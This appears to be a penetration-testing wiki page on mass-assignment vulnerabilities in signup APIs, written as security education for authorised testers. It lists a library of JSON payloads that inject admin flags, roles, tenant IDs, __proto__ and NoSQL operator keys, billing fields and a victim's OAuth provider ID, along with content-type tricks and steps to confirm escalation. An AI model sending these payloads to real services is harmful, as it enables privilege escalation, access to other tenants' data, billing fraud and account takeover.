---
tags:
  - Web
---

# :material-form-textbox: Mass Assignment

<span class="pill pill-hard">privesc</span> <span class="pill pill-info">web</span> <span class="pill pill-medium">api</span>

**Mass assignment** (a.k.a. auto-binding / object injection) happens when a framework deserializes the request body straight onto an internal model. Send a field the UI never sends, and if there's no allowlist the server happily writes it — `role`, `isAdmin`, `email_verified`, `plan`, `organization_id`.

*Payload set from "Uncovering Invisible Privileges: The Ultimate Guide to Mass-Assignment in Registration Flows" by [coffinxp](https://medium.com/@coffinxp).*

!!! abstract "TL;DR"
    Take the signup JSON, add a field that shouldn't be user-controlled, resend, then **re-fetch your own profile** and check whether it stuck. Rotate through name variants, casings, types and nesting shapes — most backends only filter the exact key spelling the developer thought of.

## :material-help-circle: Why registration is the sweet spot

- Signup is one of the few endpoints reachable **unauthenticated**, so there's no access control in front of it to get in your way.
- The user model is at its fattest here: roles, tenancy, verification state, billing plan and onboarding status all hang off the same object the signup handler creates.
- It's usually the *oldest* handler in the codebase, written before the team adopted DTOs/serializer allowlists.
- Anything you set at creation time skips the update-path validation that *would* have rejected it later.

## :material-magnify: Finding the hidden fields

You're guessing at a schema — so stop guessing where you can:

1. **Read back your own object.** `GET /api/v1/me`, `/profile`, `/account` — the response is a list of writable field names. Fields you see in the response but never send are prime candidates.
2. **Diff privilege levels.** If you can see an admin/premium account's serialized object (docs, demo tenant, a sibling API), diff it against yours.
3. **Grep the JS bundles.** Frontend models, TypeScript interfaces and GraphQL schemas leak the full field list.
4. **Hit the other endpoints.** An `/admin/users/create` or `PATCH /users/{id}` route documents the field names that `/register` will probably also accept.
5. **API docs / OpenAPI.** `/swagger.json`, `/openapi.yaml`, `/api-docs` — sometimes the spec lists fields the UI never renders.
6. **Error messages.** Type errors ("expected boolean for is_admin") confirm a field exists even when the value is rejected.

!!! tip "Burp workflow"
    Send the signup request to Repeater, keep one tab per payload group below, and use **Comparer** on the responses. Intruder with a wordlist of field names in a single injected key position (`"§isAdmin§": true`) sweeps the namespace fast — see [Burp](../toolbox/burp.md).

## :material-code-json: Payload library

Everything below is sent to the signup endpoint — swap `/api/v1/register` for whatever the target actually uses (`/auth/create`, `/user/create`, `/mobile/register`, …).

### Baseline payloads (different usernames and emails)

Clean requests first. They establish how uniqueness checks, email normalisation, plus-addressing and subdomain addresses behave, so you have something to diff against once you start adding suspicious keys.

```json
{
  "username":"probe_user_01",
  "email":"probe01@example.com",
  "password":"Password1!"
}
```

```json
{
  "username":"tester.jane",
  "email":"jane.tester+1@example.com",
  "password":"Password1!"
}
```

```json
{
  "username":"alpha_user",
  "email":"alpha.user@sub.example.com",
  "password":"Password1!"
}
```

```json
{
  "username":"bot_automation",
  "email":"bot+signup@example.co.uk",
  "password":"Password1!"
}
```

### Boolean / admin flag attempts (case and type variants)

The direct approach. Vary the casing, the separator and the value type — filters are usually a hardcoded list of exact strings, so `ADMIN` or `is_admin` slips past a check that only knew about `isAdmin`.

```json
{
  "username":"probe_user_01",
  "email":"probe01@example.com",
  "isAdmin": true,
  "password":"Password1!"
}
```

```json
{
  "username":"probe_user_01",
  "email":"probe01@example.com",
  "admin": "true",
  "password":"Password1!"
}
```

```json
{
  "username":"probe_user_01",
  "email":"probe01@example.com",
  "ADMIN": 1,
  "password":"Password1!"
}
```

```json
{
  "username":"probe_user_01",
  "email":"probe01@example.com",
  "is_admin": 1,
  "password":"Password1!"
}
```

### Role, privilege strings, and numeric flags

Where privilege is a name or a foreign key rather than a boolean. `role_id:0` is worth its own shot — seeded databases love putting the superuser at ID 0 or 1.

```json
{
  "username":"role_tester",
  "email":"role.tester@example.com",
  "role":"admin",
  "password":"Password1!"
}
```

```json
{
  "username":"role_tester",
  "email":"role.tester@example.com",
  "role":"superuser",
  "password":"Password1!"
}
```

```json
{
  "username":"role_tester",
  "email":"role.tester@example.com",
  "role_id":0,
  "password":"Password1!"
}
```

```json
{
  "username":"role_tester",
  "email":"role.tester@example.com",
  "user_priv":"administrator",
  "password":"Password1!"
}
```

### Organization / tenant field variants

In multi-tenant SaaS, the tenant reference decides what data you see. Bind yourself to someone else's org at creation time and you're inside their workspace with a legitimately issued session.

```json
{
  "username":"org_probe",
  "email":"org.probe@example.com",
  "org":"CompanyA",
  "password":"Password1!"
}
```

```json
{
  "username":"org_probe",
  "email":"org.probe@example.com",
  "organization_id":1,
  "password":"Password1!"
}
```

```json
{
  "username":"org_probe",
  "email":"org.probe@example.com",
  "org_slug":"internal-team",
  "password":"Password1!"
}
```

### Nested objects and prototype-style payloads

Nested objects are frequently merged into the model wholesale, escaping a filter that only inspected top-level keys. `__proto__` targets JS backends that deep-merge without key sanitisation.

```json
{
  "username":"nested_user",
  "email":"nested.user@example.com",
  "password":"Password1!",
  "profile": {
    "bio":"testing",
    "visibility":"private"
  }
}
```

```json
{
  "username":"proto_user",
  "email":"proto.user@example.com",
  "password":"Password1!",
  "__proto__": {"isAdmin": true}
}
```

### Deeply nested and dot-notation keys

Some stacks expand dotted keys into nested objects; others flatten nested objects into dotted paths. Send both shapes — the mismatch between the validator's view and the ORM's view is exactly where the write slips through.

```json
{
  "username":"deep_user",
  "email":"deep.user@example.com",
  "password":"Password1!",
  "account": {
    "meta": {
      "role":"admin"
    }
  }
}
```

```json
{
  "username":"deep_user",
  "email":"deep.user@example.com",
  "password":"Password1!",
  "account.role":"admin"
}
```

### Type confusion and mismatched data types

Coercion rules differ per language. A string `"false"` is truthy in PHP and JS; `0` and `null` can knock a field into a default the app treats as privileged, or crash a validator into a permissive fallback path.

```json
{
  "username":"type_user",
  "email":"type.user@example.com",
  "password":"Password1!",
  "admin": "false"
}
```

```json
{
  "username":"type_user",
  "email":"type.user@example.com",
  "password":"Password1!",
  "admin": 0
}
```

```json
{
  "username":"type_user",
  "email":"type.user@example.com",
  "password":"Password1!",
  "admin": null
}
```

### Arrays and list-based tampering

Wrapping scalars in arrays exposes parsers that take the first element, join to a string, or skip validation on non-scalars entirely. A `roles` array also tests whether the app takes the union of what you send.

```json
{
  "username":["array_user"],
  "email":["array.user@example.com"],
  "password":["Password1!"]
}
```

```json
{
  "username":"array_user",
  "email":"array.user@example.com",
  "password":"Password1!",
  "roles":["user","admin"]
}
```

### MongoDB / NoSQL operator payloads

When the body reaches a NoSQL driver unfiltered, operator objects change the *query*, not just the value. Only run these where you're authorised — `$ne`/`$gt` can match far more than you intended.

```json
{
  "username":"mongo_user",
  "email":"mongo.user@example.com",
  "password":"Password1!",
  "isAdmin": {"$ne": null}
}
```

```json
{
  "username":{"$gt": ""},
  "email":"injection@example.com",
  "password":"Password1!"
}
```

More in [NoSQL Injection](nosql-injection.md).

### Parameter aliases, synonyms, and name variants

Django says `is_superuser`, other codebases say `staff`. Legacy column names often survive behind a renamed API field, and the ORM still accepts the old one.

```json
{
  "username":"alias_user",
  "email":"alias.user@example.com",
  "password":"Password1!",
  "is_superuser": true
}
```

```json
{
  "username":"alias_user",
  "email":"alias.user@example.com",
  "password":"Password1!",
  "super_user": true
}
```

```json
{
  "username":"alias_user",
  "email":"alias.user@example.com",
  "password":"Password1!",
  "staff": true
}
```

### Verification and timestamp manipulation

Self-verify, or push an expiry into the past/future to disable the check. This is the cheapest way to skip an email-confirmation gate without ever receiving the mail.

```json
{
  "username":"verify_user",
  "email":"verify.user@example.com",
  "password":"Password1!",
  "email_verified": true
}
```

```json
{
  "username":"verify_user",
  "email":"verify.user@example.com",
  "password":"Password1!",
  "verification_expires":"1970-01-01T00:00:00Z"
}
```

### Metadata and opaque JSON fields

Free-form `metadata`/`attributes`/`custom_fields` blobs are almost never filtered — they're a passthrough by design. If anything downstream reads a privilege hint out of that blob, you own it.

```json
{
  "username":"meta_user",
  "email":"meta.user@example.com",
  "password":"Password1!",
  "metadata": {
    "internal_role":"admin",
    "created_by":"script"
  }
}
```

### Encoding and content-type tricks

Validation middleware is often wired to the JSON content type only, while the framework's body parser is more forgiving. Declare something else and the same body may reach the model down a code path with no filtering at all.

```http
POST /api/v1/register
Content-Type: text/plain

{
  "username": "ct_user",
  "email": "ct.user@example.com",
  "password": "Password1!",
  "isAdmin": true
}
```

Also send the request with **no** `Content-Type` header at all, and cycle through these:

```http
Content-Type: application/x-www-form-urlencoded
Content-Type: application/xml
Content-Type: */*
Content-Type: application/json; charset=garbage
Content-Type: application/json; boundary=--
Content-Type: application/json; x=1
```

### String-encoded JSON fields

A field stored as a JSON *string* often gets parsed later by some other component that never saw the validator. Common in schemaless or "flexible" models.

```json
{
  "username":"string_json",
  "email":"string.json@example.com",
  "password":"Password1!",
  "profile":"{\"isAdmin\":true}"
}
```

### Large / repeated fields

Not privesc, but it maps length limits, truncation behaviour and error paths — and truncation is what makes null-byte and homograph tricks work elsewhere in the flow.

```json
{
  "username":"long_user",
  "email":"long.user@example.com",
  "password":"Password1!",
  "bio":"AAAAAA... (very long string)"
}
```

### Subscription & billing bypass

Underrated and easy to demo financial impact with. SaaS user models carry plan/trial/entitlement fields, and the signup handler writes the model before the billing service ever sees you.

```json
{
  "username": "freeloader",
  "email": "free@example.com",
  "plan": "pro",
  "password": "Password1!"
}
```

```json
{
  "username": "freeloader",
  "email": "free@example.com",
  "subscription_id": 9999,
  "password": "Password1!"
}
```

```json
{
  "username": "freeloader",
  "email": "free@example.com",
  "is_premium": true,
  "password": "Password1!"
}
```

```json
{
  "username": "freeloader",
  "email": "free@example.com",
  "trial_ends_at": "2050-01-01T00:00:00Z",
  "password": "Password1!"
}
```

### Workflow state jumping

Accounts move through `pending → active → suspended → banned`. If that state lives on the model you're creating, set the end state directly and skip verification, approval queues, or an unban.

```json
{
  "username": "status_jumper",
  "email": "jump@example.com",
  "status": "active",
  "password": "Password1!"
}
```

```json
{
  "username": "status_jumper",
  "email": "jump@example.com",
  "state": "verified",
  "password": "Password1!"
}
```

```json
{
  "username": "status_jumper",
  "email": "jump@example.com",
  "email_verified": true,
  "password": "Password1!"
}
```

### OAuth & provider spoofing

Social login stores a provider identity on the same user row. Inject that identity through the *password* signup route and, if the link isn't verified against the provider, your account becomes the one that "Sign in with Google" resolves to.

```json
{
  "username": "oauth_spoof",
  "email": "spoof@example.com",
  "provider": "google",
  "provider_id": "100234234234...", // ID of a victim
  "password": "Password1!"
}
```

```json
{
  "username": "oauth_spoof",
  "email": "spoof@example.com",
  "auth_strategy": "ldap",
  "password": "Password1!"
}
```

See [OAuth / SAML](oauth-saml.md) for the account-linking side of this.

### Combination payload (high-value finding)

Stacking shapes hits several deserialisation paths in one request — useful when partial filtering blocks each technique on its own.

```json
{
  "username":"combo_user",
  "email":"combo.user+test@example.com",
  "password":"Password1!",
  "__proto__": {"isAdmin": true},
  "profile": {"role":"admin"},
  "metadata": "{\"elevate\":true}"
}
```

## :material-check-decagram: Confirming the write actually landed

A `200 OK` proves nothing — most APIs silently drop unknown keys. You need positive evidence:

- **Response diffing.** Baseline the clean signup response, then diff every mutated one. Watch for a new key appearing, a changed field ordering, a different length, or a different status/error text. A `400` complaining about the *type* of your injected field means the field is real.
- **Re-fetch the object.** `GET /api/v1/me` (or `/profile`, `/account`, `/users/{id}`) right after signup and look for your value echoed back. This is the single most reliable check.
- **Exercise the privilege.** The write only matters if the app reads it. Hit an admin-only route, load a tenant-scoped listing, check whether a paid feature unlocked, or confirm you can log in without clicking the verification mail.
- **Compare against a control account.** Register a clean account in parallel and diff the two profile objects — that isolates your injected field from server-side defaults.
- **Watch out-of-band.** No response change but a Collaborator hit, a welcome email addressed to a different tenant, or an admin-notification mail all count as signal.

!!! bug "Nothing sticks? Widen the shape, not the wordlist"
    - Try the same field on the **update** path (`PATCH /users/me`) — creation may filter while update doesn't, or vice versa.
    - Send the field **twice** with different values, or once at top level and once nested.
    - Swap the body encoding entirely: form-urlencoded (`isAdmin=true`), XML, or a multipart part.
    - Add the field as a **query parameter** on the POST — some frameworks merge query, body and route params into one bag.

!!! loot "Impact framing for the report"
    Chain it. Mass assignment on its own is "I set a field"; mass assignment **plus** a working admin endpoint, another tenant's data, or a paid feature is a critical. Always demonstrate the privilege being used, not just stored.

## :material-link-variant: Related

- Signup is where this bug lives — the full flow is in [Registration & Signup Flaws](registration.md).
- Once elevated, sweep object references with [IDOR](idor.md) and role checks with [Auth Bypass](auth-bypass.md).
- `__proto__` keys deserve their own pass: [Prototype Pollution](prototype-pollution.md).
- Tooling: [Burp](../toolbox/burp.md) (Repeater, Intruder, Comparer, param-miner).
- Reference: [OWASP API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/).
